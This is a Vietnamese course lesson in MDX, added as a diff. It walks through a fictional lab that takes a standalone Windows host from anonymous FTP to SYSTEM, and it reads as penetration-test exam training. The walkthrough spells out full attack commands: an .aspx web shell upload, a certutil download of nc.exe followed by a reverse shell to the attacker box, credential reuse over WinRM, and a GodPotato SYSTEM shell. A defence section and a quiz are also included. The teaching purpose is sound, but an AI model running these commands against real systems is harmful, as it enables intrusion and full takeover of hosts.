@@ -1,0 +1,379 @@
+---
+title: "Capstone: chiếm trọn một máy Windows"
+code: "5.3"
+level: 5
+summary: "Dạng máy thứ ba của đề thi: một máy Windows đơn lẻ. Đi từ một cổng FTP ẩn danh tới SYSTEM, có cả một lần công cụ không chạy và cách xoay sang đường khác."
+duration: "90 phút"
+updated: "2026-11-12"
+prereq: ["2.7", "2.8", "3.2"]
+objectives:
+  - "Nối liệt kê dịch vụ, tải file lên web, reverse shell và leo quyền Windows thành một chuỗi liền mạch"
+  - "Xử lý được tình huống công cụ đầu tiên thất bại mà không bỏ hướng đi đúng"
+  - "Chụp đủ bằng chứng local.txt và proof.txt theo đúng yêu cầu chấm điểm"
+  - "Tách chuỗi tấn công thành các mục phát hiện riêng, mỗi mục có cách khắc phục"
+---
+import ConceptMap from '../../components/sim/ConceptMap.tsx';
+import Callout from '../../components/ui/Callout.astro';
+import Walkthrough from '../../components/sim/Walkthrough.tsx';
+import DecisionTree from '../../components/sim/DecisionTree.tsx';
+import Quiz from '../../components/sim/Quiz.tsx';
+
+## Hình dung trước
+
+Bài 5.1 đi trọn một máy Linux, bài 5.2 đi trọn một miền Active Directory. Còn thiếu dạng thứ ba mà đề thi gần như chắc chắn có: **một máy Windows đứng riêng**, không thuộc miền nào.
+
+Về tư duy nó giống bài 5.1 (liệt kê, tìm đường vào, leo quyền), nhưng mọi công cụ và thói quen đều đổi: không có `sudo -l`, không có `/etc/passwd`; thay vào đó là IIS, tài khoản dịch vụ, token và đặc quyền.
+
+Bài này đi trên máy lab hư cấu `10.10.14.45`. Có một điểm khác hai bài trước: giữa chừng, công cụ đầu tiên bạn thử sẽ **không chạy**. Đó là chủ ý, vì trong phòng thi chuyện này xảy ra thường xuyên, và cách bạn phản ứng lúc đó quyết định bạn mất 5 phút hay 2 giờ.
+
+<Callout type="warn">
+Máy, mật khẩu và địa chỉ ở đây đều là giả. Mọi kỹ thuật chỉ thực hành trên máy của bạn hoặc nơi được phép (xem trang Quy tắc).
+</Callout>
+
+## Tự thử sức trước khi xem lời giải
+
+Bạn có địa chỉ `10.10.14.45` và máy Kali ở `10.10.14.7`. Trước khi mở lời giải, hãy tự viết ra giấy câu trả lời cho năm câu hỏi dưới đây. Mỗi câu có một gợi ý, chỉ mở khi đã thử nghĩ.
+
+1. Kết quả quét cho thấy cổng 21, 80, 445 và 5985. Bạn hỏi chuyện dịch vụ nào trước, bằng lệnh gì?
+
+<details className="hint">
+<summary>Gợi ý 1</summary>
+
+Đọc output `nmap -sC` trước: script `ftp-anon` cho biết FTP có cho đăng nhập ẩn danh không. Dịch vụ nào cho vào mà không cần mật khẩu thì hỏi nó trước (bài 2.2).
+
+</details>
+
+2. Bạn tải được một file lên máy chủ web. Loại file nào thì IIS sẽ *chạy* thay vì chỉ trả về nội dung?
+
+<details className="hint">
+<summary>Gợi ý 2</summary>
+
+IIS chạy mã ASP.NET, nên web shell phải là `.aspx` (trên Apache/PHP là `.php`). Kali có sẵn một cái ở `/usr/share/webshells/aspx/cmdasp.aspx` (bài 2.8).
+
+</details>
+
+3. Bạn chạy được lệnh dưới tên một tài khoản dịch vụ của IIS. Lệnh đầu tiên cần gõ để tìm đường leo quyền là gì?
+
+<details className="hint">
+<summary>Gợi ý 3</summary>
+
+`whoami /priv`. Tài khoản dịch vụ web trên Windows gần như luôn có một đặc quyền rất đáng giá (bài 3.2).
+
+</details>
+
+4. Công cụ leo quyền đầu tiên báo lỗi. Bạn kết luận gì: hướng đi sai, hay công cụ không hợp?
+
+<details className="hint">
+<summary>Gợi ý 4</summary>
+
+Đặc quyền vẫn còn đó thì hướng đi vẫn đúng. Mỗi công cụ trong họ Potato dựa vào một thành phần Windows khác nhau; đọc thông báo lỗi để biết thành phần nào thiếu, rồi đổi công cụ.
+
+</details>
+
+5. Bạn tìm thấy một mật khẩu trong file cấu hình web. Thử nó ở đâu?
+
+<details className="hint">
+<summary>Gợi ý 5</summary>
+
+Ở mọi dịch vụ đang mở cho đăng nhập (ở đây là SMB 445 và WinRM 5985), với mọi tên tài khoản có trên máy (`net user`). NetExec thử cả loạt trong một lệnh.
+
+</details>
+
+<details className="hint walkthrough-solution">
+<summary>Mở xem lời giải từng bước (đối chiếu sau khi bạn đã tự thử)</summary>
+
+<Walkthrough
+  client:visible
+  title="Từ FTP ẩn danh tới SYSTEM"
+  steps={[
+    {
+      phase: 'Quét',
+      title: 'Quét toàn bộ cổng rồi quét sâu',
+      cmd: 'nmap -p- --min-rate 2000 10.10.14.45 && nmap -p 21,80,135,445,5985 -sC -sV 10.10.14.45',
+      explain: ['Lệnh đầu tìm mọi cổng mở; lệnh sau chạy script mặc định (-sC) và dò phiên bản (-sV) chỉ trên các cổng vừa tìm được.'],
+      output: [
+        { text: '21/tcp   open  ftp      Microsoft ftpd' },
+        { text: '| ftp-anon: Anonymous FTP login allowed (FTP code 230)', hit: true },
+        { text: '80/tcp   open  http     Microsoft IIS httpd 10.0' },
+        { text: '|_http-title: Megacorp Helpdesk' },
+        { text: '445/tcp  open  microsoft-ds' },
+        { text: '5985/tcp open  http     Microsoft HTTPAPI httpd 2.0', hit: true },
+      ],
+      takeaway: 'IIS 10.0 nghĩa là Windows Server 2016 trở lên. Hai điều ghi ngay vào sổ: FTP cho vào ẩn danh (hỏi nó trước), và WinRM 5985 mở (có tài khoản là có đường đăng nhập). (Bài 2.2)',
+    },
+    {
+      phase: 'Liệt kê',
+      title: 'Vào FTP ẩn danh, đọc mọi thứ đọc được',
+      cmd: 'ftp 10.10.14.45',
+      explain: ['Đăng nhập với tên anonymous, mật khẩu để trống. ls -la liệt kê cả file ẩn; get tải file về Kali.'],
+      output: [
+        { text: 'Name: anonymous' },
+        { text: '230 User logged in.' },
+        { text: 'ftp> ls -la' },
+        { text: '11-02-26  09:14AM       412 ghi-chu-it.txt', hit: true },
+        { text: 'ftp> get ghi-chu-it.txt' },
+        { text: 'ftp> put test.txt' },
+        { text: '550 Access is denied.' },
+      ],
+      takeaway: 'Luôn thử cả put: FTP ghi được là một đường vào khác hẳn. Ở đây chỉ đọc được, nên giá trị nằm ở nội dung file. (Bài 2.2)',
+    },
+    {
+      phase: 'Liệt kê',
+      title: 'Ghi chú của quản trị viên chỉ đường',
+      cmd: 'cat ghi-chu-it.txt',
+      explain: ['File để quên trên FTP, share SMB hay thư mục web thường là nguồn manh mối tốt nhất của cả máy.'],
+      output: [
+        { text: 'Lan oi, trang gui phieu ho tro /support/ dang tam cho dinh kem' },
+        { text: 'moi loai tep vi khach phan nan khong gui duoc file log.', hit: true },
+        { text: 'Tep luu o /support/files/. Tuan sau anh loc lai duoi tep.' },
+        { text: '-- Khanh (IT)' },
+      ],
+      takeaway: 'Ba thông tin: một trang tải file không lọc loại tệp, nơi file được lưu, và hai cái tên (Lan, Khanh) có thể là tài khoản. Tải file không lọc trên IIS nghĩa là thử web shell .aspx. (Bài 2.8)',
+      tone: 'warn',
+    },
+    {
+      phase: 'Đường vào',
+      title: 'Tải web shell lên qua biểu mẫu',
+      cmd: "curl -s -F 'attachment=@/usr/share/webshells/aspx/cmdasp.aspx;filename=log.aspx' -F 'subject=test' http://10.10.14.45/support/submit.aspx",
+      explain: ['-F gửi dữ liệu kiểu biểu mẫu có tệp đính kèm. Tên trường (attachment, subject) lấy từ mã HTML của biểu mẫu, xem bằng curl hoặc Burp. filename= đặt tên file trên máy chủ.'],
+      output: [
+        { text: '<p>Da nhan phieu. Tep dinh kem: files/log.aspx</p>', hit: true },
+      ],
+      takeaway: 'Máy chủ nhận file .aspx và cho biết luôn đường dẫn. Nếu nó đổi tên file, quay lại gobuster hoặc đọc mã nguồn trang để tìm quy tắc đặt tên. (Bài 2.8)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Đường vào',
+      title: 'Xác nhận chạy được lệnh',
+      cmd: "curl -s 'http://10.10.14.45/support/files/log.aspx' --data-urlencode 'cmd=whoami' -G",
+      explain: ['Gọi web shell với tham số cmd. -G cùng --data-urlencode để curl tự mã hoá ký tự đặc biệt trong lệnh. Tên tham số tuỳ web shell: mở file ra đọc trước khi dùng.'],
+      output: [
+        { text: 'iis apppool\\helpdesk', hit: true },
+      ],
+      takeaway: 'Lệnh chạy dưới tên tài khoản dịch vụ của IIS. Web shell chỉ là bàn đạp: mỗi lệnh là một request riêng, không giữ thư mục, không chạy được chương trình tương tác, và không dùng để chụp bằng chứng. Cần một reverse shell. (Bài 2.7, 4.2)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Đường vào',
+      title: 'Đổi web shell thành reverse shell',
+      cmd: 'certutil -urlcache -f http://10.10.14.7/nc.exe C:\\Windows\\Temp\\nc.exe && C:\\Windows\\Temp\\nc.exe 10.10.14.7 443 -e cmd.exe',
+      prompt: '(gửi qua tham số cmd của web shell)',
+      explain: ['Trên Kali mở sẵn python3 -m http.server 80 (trong thư mục có nc.exe) và nc -lvnp 443. certutil tải nc.exe về thư mục Temp, nơi mọi tài khoản ghi được; nc.exe gọi ngược về Kali và trao cmd.exe.'],
+      output: [
+        { text: 'kali@lab:~$ nc -lvnp 443' },
+        { text: 'connect to [10.10.14.7] from 10.10.14.45', hit: true },
+        { text: 'C:\\windows\\system32\\inetsrv> whoami' },
+        { text: 'iis apppool\\helpdesk' },
+      ],
+      takeaway: 'Đã có shell tương tác. Từ đây là quy trình leo quyền của bài 3.2: nhìn đặc quyền trước, rồi tìm thông tin để lộ. (Bài 2.7)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Leo thang',
+      title: 'Nhìn đặc quyền của token',
+      cmd: 'whoami /priv',
+      prompt: 'C:\\windows\\system32\\inetsrv>',
+      explain: ['Liệt kê đặc quyền của phiên hiện tại. Với tài khoản dịch vụ, đây luôn là lệnh đầu tiên.'],
+      output: [
+        { text: 'Privilege Name                Description                               State' },
+        { text: 'SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled' },
+        { text: 'SeImpersonatePrivilege        Impersonate a client after authentication Enabled', hit: true },
+      ],
+      takeaway: 'SeImpersonate Enabled: họ Potato là đường thẳng tới SYSTEM. Trước khi chạy, lục thêm thông tin để lộ, vì máy thi cần cả local.txt của một người dùng thường. (Bài 3.2)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Leo thang',
+      title: 'Mật khẩu trong web.config',
+      cmd: 'type C:\\inetpub\\wwwroot\\support\\web.config | findstr /i "password connectionString"',
+      prompt: 'C:\\windows\\system32\\inetsrv>',
+      explain: ['web.config là file cấu hình của ứng dụng ASP.NET, tương đương config.php ở bài 5.1. findstr /i lọc các dòng có chữ password hoặc connectionString.'],
+      output: [
+        { text: '<add name="db" connectionString="Server=.;Database=helpdesk;User Id=helpdesk_app;Password=Hd!Winter2026" />', hit: true },
+      ],
+      takeaway: 'Một mật khẩu. Phản xạ giống bài 5.1: thử nó cho mọi tài khoản người thật trên máy. net user cho thấy có lan.pham và khanh.do. (Bài 2.6)',
+      tone: 'warn',
+    },
+    {
+      phase: 'Leo thang',
+      title: 'Thử mật khẩu vừa nhặt cho các tài khoản trên máy',
+      cmd: "nxc winrm 10.10.14.45 -u lan.pham khanh.do Administrator -p 'Hd!Winter2026' --local-auth",
+      explain: ['nxc winrm thử đăng nhập qua WinRM. Cho nhiều tên sau -u thì nó thử lần lượt. --local-auth vì đây là tài khoản cục bộ, máy không thuộc miền nào.'],
+      output: [
+        { text: 'WINRM  10.10.14.45  5985  HELPDESK01  [-] HELPDESK01\\lan.pham:Hd!Winter2026' },
+        { text: 'WINRM  10.10.14.45  5985  HELPDESK01  [+] HELPDESK01\\khanh.do:Hd!Winter2026 (Pwn3d!)', hit: true },
+      ],
+      takeaway: 'Khanh dùng lại mật khẩu của ứng dụng cho tài khoản của mình. (Pwn3d!) với WinRM nghĩa là đăng nhập từ xa được. Vào bằng evil-winrm và lấy local.txt. (Bài 3.9)',
+      tone: 'bad',
+    },
+    {
+      phase: 'Leo thang',
+      title: 'Lấy local.txt đúng cách',
+      cmd: "evil-winrm -i 10.10.14.45 -u khanh.do -p 'Hd!Winter2026'",
+      explain: ['Mở một phiên PowerShell qua WinRM. Ba lệnh sau gom đủ thứ ảnh bằng chứng cần: tài khoản, địa chỉ IP, nội dung file.'],
+      output: [
+        { text: '*Evil-WinRM* PS C:\\Users\\khanh.do\\Desktop> whoami; ipconfig | findstr IPv4; type local.txt' },
+        { text: 'helpdesk01\\khanh.do' },
+        { text: '   IPv4 Address. . . . . . . . . . . : 10.10.14.45' },
+        { text: '3f1c...9e  (mã local.txt)', hit: true },
+      ],
+      takeaway: 'Chụp màn hình ngay lúc này, một ảnh có đủ ba thứ. whoami /groups cho thấy khanh.do không thuộc nhóm Administrators, nên đường lên SYSTEM vẫn là SeImpersonate ở shell IIS. Giữ cả hai shell. (Bài 4.2)',
+      tone: 'good',
+    },
+    {
+      phase: 'Chiếm quyền',
+      title: 'Công cụ đầu tiên không chạy',
+      cmd: 'C:\\Windows\\Temp\\PrintSpoofer64.exe -i -c cmd',
+      prompt: 'C:\\windows\\system32\\inetsrv>',
+      explain: ['Quay lại shell IIS. PrintSpoofer dụ dịch vụ Print Spooler (chạy bằng SYSTEM) kết nối vào một named pipe rồi mượn token của nó.'],
+      output: [
+        { text: '[+] Found privilege: SeImpersonatePrivilege' },
+        { text: '[+] Named pipe listening...' },
+        { text: '[-] Operation failed or timed out.', hit: true },
+        { text: 'C:\\windows\\system32\\inetsrv> sc query Spooler' },
+        { text: '        STATE              : 1  STOPPED', hit: true },
+      ],
+      takeaway: 'Đừng bỏ hướng này. Thông báo lỗi nói rõ: pipe đã mở nhưng không ai kết nối vào. sc query xác nhận dịch vụ Spooler đã bị tắt (một bước cứng hoá đúng). Đặc quyền vẫn còn, chỉ cần một công cụ không phụ thuộc Spooler. (Bài 3.2)',
+      tone: 'warn',
+    },
+    {
+      phase: 'Chiếm quyền',
+      title: 'Đổi sang GodPotato',
+      cmd: 'C:\\Windows\\Temp\\GodPotato-NET4.exe -cmd "C:\\Windows\\Temp\\nc.exe 10.10.14.7 4444 -e cmd.exe"',
+      prompt: 'C:\\windows\\system32\\inetsrv>',
+      explain: ['GodPotato lợi dụng DCOM thay vì Spooler. -cmd là lệnh chạy bằng SYSTEM: ở đây là một reverse shell thứ hai về cổng 4444, nơi Kali đã mở nc -lvnp 4444.'],
+      output: [
+        { text: '[*] CurrentUser: NT AUTHORITY\\SYSTEM' },
+        { text: 'kali@lab:~$ nc -lvnp 4444' },
+        { text: 'connect to [10.10.14.7] from 10.10.14.45' },
+        { text: 'C:\\> whoami & ipconfig | findstr IPv4 & type C:\\Users\\Administrator\\Desktop\\proof.txt' },
+        { text: 'nt authority\\system', hit: true },
+        { text: '   IPv4 Address. . . . . . . . . . . : 10.10.14.45' },
+        { text: 'a7d0...42  (mã proof.txt)' },
+      ],
+      takeaway: 'SYSTEM. Chụp ảnh bằng chứng thứ hai, cũng đủ ba thứ trong một shell tương tác. Máy này trọn 20 điểm. (Bài 3.2, 4.2)',
+      tone: 'good',
+    },
+    {
+      phase: 'Báo cáo',
+      title: 'Tách thành các mục phát hiện',
+      takeaway: 'Chuỗi này có BỐN phát hiện: (1) FTP ẩn danh để lộ ghi chú nội bộ; (2) trang tải file không lọc loại tệp, dẫn tới chạy mã từ xa — đường vào; (3) mật khẩu chữ rõ trong web.config, lại dùng chung với tài khoản người dùng; (4) tài khoản dịch vụ IIS có SeImpersonate trên máy thiếu lớp chặn công cụ leo quyền — đường lên SYSTEM. Ghi cả lần PrintSpoofer thất bại vào phần mô tả: nó cho khách hàng biết việc tắt Spooler có tác dụng, nhưng chưa đủ. Trước khi nộp, xoá log.aspx, nc.exe và các công cụ đã tải lên, và ghi việc dọn dẹp vào báo cáo. (Bài 4.1)',
+      tone: 'good',
+    },
+  ]}
+/>
+
+</details>
+
+## Nhìn lại cả mạch
+
+<ConceptMap
+  client:visible
+  title="Cả chuỗi trên một hình: hai đường song song gặp nhau ở SYSTEM"
+  width={700}
+  height={300}
+  nodes={[
+    { id: 'ftp', label: 'FTP ẩn danh', sub: 'ghi chú của IT', x: 80, y: 150, w: 140, detail: 'Không cần mật khẩu. File ghi chú chỉ ra trang tải file không lọc loại tệp.' },
+    { id: 'up', label: 'Tải web shell .aspx', sub: 'chạy lệnh qua web', x: 264, y: 150, w: 160, tone: 'warn', detail: 'Đường vào. Lệnh chạy dưới tên tài khoản dịch vụ của IIS.' },
+    { id: 'iis', label: 'Shell IIS', sub: 'có SeImpersonate', x: 455, y: 80, w: 150, tone: 'warn', detail: 'Reverse shell của tài khoản dịch vụ. whoami /priv cho thấy đặc quyền dẫn thẳng tới SYSTEM.' },
+    { id: 'cfg', label: 'web.config', sub: 'mật khẩu chữ rõ', x: 455, y: 225, w: 150, detail: 'Mật khẩu ứng dụng, dùng lại cho tài khoản khanh.do. Đăng nhập qua WinRM và lấy local.txt.' },
+    { id: 'sys', label: 'SYSTEM', sub: 'GodPotato', x: 625, y: 80, w: 110, tone: 'accent', detail: 'PrintSpoofer hỏng vì Spooler tắt; GodPotato dùng đường khác. Lấy proof.txt.' },
+    { id: 'usr', label: 'khanh.do', sub: 'local.txt', x: 625, y: 225, w: 110, tone: 'accent', detail: 'Người dùng thường, không thuộc nhóm Administrators. Cho 10 điểm đầu của máy.' },
+  ]}
+  edges={[
+    { from: 'ftp', to: 'up' },
+    { from: 'up', to: 'iis' },
+    { from: 'up', to: 'cfg' },
+    { from: 'iis', to: 'sys' },
+    { from: 'cfg', to: 'usr' },
+  ]}
+/>
+
+| Bước | Dùng kiến thức bài |
+|---|---|
+| Quét, đọc output `-sC` | 2.2 |
+| FTP ẩn danh, đọc ghi chú | 2.2 |
+| Tải web shell `.aspx` qua biểu mẫu | 2.8 |
+| Web shell thành reverse shell | 2.7 |
+| `whoami /priv`, thấy SeImpersonate | 3.2 |
+| Mật khẩu trong `web.config`, thử lại qua WinRM | 2.6, 3.9 |
+| PrintSpoofer hỏng, đổi GodPotato | 3.2 |
+| Chụp bằng chứng, viết báo cáo | 4.1, 4.2 |
+
+So với bài 5.1, khung không đổi: liệt kê, đường vào, thông tin để lộ, leo quyền. Thứ đổi là từng công cụ: `config.php` thành `web.config`, `su` thành `evil-winrm`, `sudo -l` thành `whoami /priv`, GTFOBins thành họ Potato. Nếu bạn thấy mình chỉ thuộc một trong hai cột, đó là chỗ cần luyện thêm.
+
+<Callout type="note" label="Bài học riêng của máy này: lỗi của công cụ không phải lỗi của hướng đi">
+Khi một công cụ thất bại, hỏi ba câu theo thứ tự: <strong>điều kiện tiên quyết còn đúng không</strong> (đặc quyền vẫn Enabled); <strong>công cụ này cần thêm gì</strong> (Spooler, một phiên bản .NET, kiến trúc 64 bit); <strong>có công cụ nào cùng họ không cần thứ đó</strong>. Chỉ khi cả ba câu đều bế tắc mới đổi hướng. Người mới thường làm ngược lại: bỏ hướng đúng sau một lần lỗi rồi mất hàng giờ ở hướng sai.
+</Callout>
+
+## Mô phỏng: Xử lý tình huống khi công cụ leo quyền bị lỗi
+
+<DecisionTree
+  client:visible
+  title="Xử lý bế tắc leo quyền: Khi PrintSpoofer thất bại trên Windows"
+  start="stuck_spooler"
+  nodes={{
+    stuck_spooler: {
+      q: 'Bạn có shell IIS AppPool và thấy SeImpersonatePrivilege là Enabled. Bạn chạy PrintSpoofer nhưng nhận lỗi "Timeout waiting for named pipe connection". Phản xạ của bạn là gì?',
+      options: [
+        { label: 'Cho rằng SeImpersonate bị chặn, bỏ hướng này đi tìm kernel exploit', next: 'kernel_rabbit' },
+        { label: 'Kiểm tra xem thành phần PrintSpoofer cần (dịch vụ Spooler) có đang chạy không', next: 'check_service' },
+      ],
+    },
+    kernel_rabbit: {
+      result: 'Lạc lối vào hang thỏ (Rabbit hole)! Kernel exploit trên Windows Server đã vá rất dễ làm màn hình xanh (BSOD) và sập máy thi. Đặc quyền SeImpersonate vẫn còn đó, vấn đề chỉ là do công cụ!',
+      tone: 'bad',
+    },
+    check_service: {
+      q: 'Gõ "sc query spooler" thấy trạng thái STOPPED (dịch vụ in đã bị tắt và tài khoản dịch vụ không có quyền bật lại). Làm gì tiếp?',
+      options: [
+        { label: 'Cố gắng sửa registry để ép dịch vụ Spooler khởi động lại', next: 'reg_deny' },
+        { label: 'Đổi sang công cụ khác cùng họ Potato không phụ thuộc Spooler (như GodPotato)', next: 'godpotato' },
+      ],
+    },
+    reg_deny: {
+      result: 'Bị từ chối quyền (Access Denied)! Tài khoản IIS không có quyền ghi vào HKLM System Services.',
+      tone: 'warn',
+    },
+    godpotato: {
+      result: 'Chính xác! Lỗi của công cụ không phải lỗi của hướng đi. GodPotato sử dụng cơ chế RPC OXID Resolution thay vì Named Pipe của Print Spooler, trả về ngay SYSTEM token và giúp bạn hoàn thành máy thi!',
+      tone: 'good',
+    },
+  }}
+/>
+
+## Góc phòng thủ
+
+<Callout type="defense">
+Máy này có bốn chỗ cắt được chuỗi, mỗi chỗ thuộc về một người khác nhau trong doanh nghiệp. <strong>Quản trị dịch vụ:</strong> tắt FTP ẩn danh, và không để ghi chú nội bộ ở nơi công khai. <strong>Lập trình viên:</strong> trang tải file chỉ nhận danh sách đuôi cho phép, đổi tên file khi lưu, và lưu ở thư mục mà IIS không chạy mã (bỏ quyền Script/Execute trên thư mục tải lên).
+
+<strong>Quản trị hệ thống:</strong> không để mật khẩu chữ rõ trong <code>web.config</code> (mã hoá mục connectionStrings hoặc dùng tài khoản dịch vụ được quản lý), và không cho người dùng đặt mật khẩu trùng với mật khẩu ứng dụng.
+
+<strong>Đội giám sát:</strong> tiến trình <code>w3wp.exe</code> của IIS sinh ra <code>cmd.exe</code>, <code>certutil.exe</code> tải file từ một địa chỉ lạ, và một file <code>.exe</code> mới xuất hiện trong <code>C:\Windows\Temp</code> là ba tín hiệu rõ ràng mà EDR và luật phát hiện ở bài 8.2 đều bắt được. Việc tắt Print Spooler đã chặn được một công cụ, cho thấy cứng hoá có tác dụng thật; nhưng một lớp không đủ, vì kẻ tấn công chỉ cần đổi công cụ.
+</Callout>
+
+## Lỗi người mới hay gặp
+
+- **Thấy cổng 445 là lao vào tìm EternalBlue.** Trên máy Server 2016 trở lên đã vá, SMB hiếm khi là đường vào; trong khi cổng FTP "nhàm chán" bên cạnh lại cho vào không cần mật khẩu. Hỏi chuyện mọi dịch vụ theo thứ tự dễ trước.
+- **Đọc `proof.txt` qua web shell rồi chụp ảnh.** Mã có thể đúng nhưng ảnh không hợp lệ: quy định đòi một shell tương tác có cả `whoami` và địa chỉ IP. Luôn đổi sang reverse shell trước khi lấy bằng chứng.
+- **Tải web shell `.php` lên một máy chủ IIS.** Máy chủ trả về nguyên văn mã nguồn chứ không chạy. Xác định nền tảng từ output `nmap -sV` và header `Server` rồi mới chọn loại web shell.
+- **Bỏ hướng SeImpersonate sau khi PrintSpoofer lỗi.** Đặc quyền còn thì đường còn; thứ cần đổi là công cụ.
+- **Có SYSTEM rồi quên `local.txt`.** Mỗi máy đơn có hai mã, mỗi mã 10 điểm. Từ SYSTEM bạn đọc được cả hai, nhưng phải nhớ tìm trên Desktop của từng người dùng: `dir /s /b C:\Users\*local.txt`.
+
+## Kiểm tra nhanh
+
+<Quiz
+  client:visible
+  questions={[
+    { q: 'Vì sao phải đổi web shell thành reverse shell trước khi chụp bằng chứng?', options: ['Vì web shell chậm', 'Vì bằng chứng phải lấy trong một shell tương tác, có cả tài khoản và địa chỉ IP', 'Vì web shell không đọc được file'], answer: 1, explain: 'Mã đọc qua web shell có thể không được tính điểm; ngoài ra reverse shell mới chạy được các công cụ leo quyền.' },
+    { q: 'PrintSpoofer báo hết thời gian chờ, sc query cho thấy Spooler đã tắt. Bước tiếp theo hợp lý nhất?', options: ['Chuyển sang tìm kernel exploit', 'Dùng một công cụ cùng họ không phụ thuộc Spooler, như GodPotato', 'Bật lại Spooler bằng tài khoản dịch vụ'], answer: 1, explain: 'SeImpersonate vẫn còn; chỉ thành phần mà PrintSpoofer cần là thiếu. Tài khoản dịch vụ không có quyền bật lại Spooler.' },
+    { q: 'Tìm thấy mật khẩu của tài khoản cơ sở dữ liệu trong web.config. Việc đáng làm nhất?', options: ['Chỉ dùng để đăng nhập cơ sở dữ liệu', 'Thử nó cho mọi tài khoản trên máy qua SMB và WinRM', 'Bỏ qua vì không phải mật khẩu Windows'], answer: 1, explain: 'Dùng lại mật khẩu là đường leo thang hay gặp nhất, trên Windows cũng như trên Linux.' },
+    { q: 'Chuỗi tấn công này nên thành mấy mục phát hiện trong báo cáo?', options: ['Một: máy bị chiếm', 'Bốn: FTP ẩn danh, tải file không lọc, mật khẩu chữ rõ dùng chung, đặc quyền dịch vụ dẫn tới SYSTEM', 'Hai: đường vào và leo quyền'], answer: 1, explain: 'Mỗi mắt xích có người chịu trách nhiệm sửa riêng, nên mỗi mắt xích là một mục riêng.' },
+  ]}
+/>
+
+## Ghi nhớ
+
+- Máy Windows đơn lẻ theo đúng khung của máy Linux: liệt kê từng dịch vụ, tìm đường vào, lục thông tin để lộ, leo quyền. Chỉ bộ công cụ là khác.
+- Với tài khoản dịch vụ, `whoami /priv` là lệnh đầu tiên; có SeImpersonate thì thử lần lượt các công cụ họ Potato, và đọc thông báo lỗi để biết vì sao một cái không chạy.
+- Mỗi mật khẩu nhặt được đều đem thử lại ở mọi dịch vụ và mọi tài khoản; mỗi mã bằng chứng đều chụp trong shell tương tác cùng `whoami` và địa chỉ IP.
